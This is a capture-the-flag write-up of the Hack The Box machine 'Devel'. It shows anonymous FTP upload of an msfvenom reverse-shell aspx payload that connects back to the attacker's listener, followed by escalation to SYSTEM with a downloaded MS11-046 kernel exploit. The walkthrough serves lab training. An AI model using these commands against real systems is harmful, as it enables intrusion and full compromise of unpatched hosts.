## Enumeration

Our Nmap scans show only 2 ports open, running FTP and HTTP. Both are backed by IIS 7.5, telling us that the system is running Windows 7 or Server 2008 R2.

Gobuster and Nikto show nothing beyond an `/aspnet_client` subsirectory on the HTTP side.

## Initial Shell

### Probing FTP

Since web enumeration found nothing of interest, we have to assume the way forward is going to involve FTP in some way. Let's probe FTP and see what we can do.

Initial enumeration of FTP should always include an attempt to login as an `anonymous` user. In this case, we can in fact login as `anonymous`.

![](/assets/htb-devel/ftp_anon_login.png)

Now that we're in the FTP server, where are we? A simple `ls` shows that we're in the root of the web site, as we can see the default IIS page, and the `/aspnet_client` subdirectory.

![](/assets/htb-devel/ftp_webroot.png)

Now we need to test if we can place a test file in the directory as `anonymous`. Since this is the webroot, if we're able to place a file here and pull it up via the web browser, that means we have a way to possibly get RCE.

![](/assets/htb-devel/web_test_file.png)

So we can place a file, and retreive it via the web. Since this is IIS, with the `/aspnet_client` present, it means we can probably place a malicious `aspx` page, and get a shell back.

### Create payload and upload via FTP

We can use `msfvenom` to create a payload, and output it to the `aspx` format. The command `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=7500 -f aspx -o shell.aspx`

![](/assets/htb-devel/msfvenom_create.png)

Now we just need to upload it to the FTP server.

### Open listener and trigger exploit

Before we can trigger the exploit, we need to open a listener to catch the shell first. We can do this with `nc -lvnp 7500`.

Once that's setup, all we need to do it navigate a web browser to `http://10.10.10.5/shell.aspx`. We should now have a shell waiting for us in the listener.

## Privlege Escalation

### Getting our bearings

Now that we're on the system, we can look around and see what we're dealing with.

The `systeminfo` command shows that we were correct with our guess of Windows 7 as the OS. Also, note that there are no installed Hotfixes on the machine either.

A `whoami` command shows that we're currently running as an IIS web service.

A `net user` command shows that the accounts on the system are `Administrator` and `babis`. The `user.txt` flag is probably on the desktop for `babis`, with the `root.txt` flag on the desktop for `Administrator`.

We can also see that we can't navigate to the `babis` user directory.

### MS11-046

Since there are no hotfixes installed, we have our choice of kernal exploits for local exploit. MOst exploits found online will trigger, but they are not remote shell friendly. This means that even if I run them, they will open a new instance of `cmd.exe` on the PC, not just escalate my current privleges in the current shell.

[This repository for a MS11-046 exploit](https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046) tells us in the source code that it is in fact *remote-shell friendly*.

```c
// spawn shell (with elevated privileges)
    printf("         [*] Spawning shell\n");
    // spawn SYSTEM shell within the current shell (remote shell friendly)
    system ("c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32");
```

There is a pre-compiled EXE available, which makes this as simple as copying to it the target with an SMB share, and running it.

```shell
wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe

# Start an SMB server via Impacket's smbserver.py in a new terminal
smbserver.py kali .

# From the remote shell
copy \\10.10.14.16\kali\MS11-046.exe
```

Now all that's left is to run the exploit locally on the target.

### Loot!

Once we're `SYSTEM`, grabbing flags is trivial.
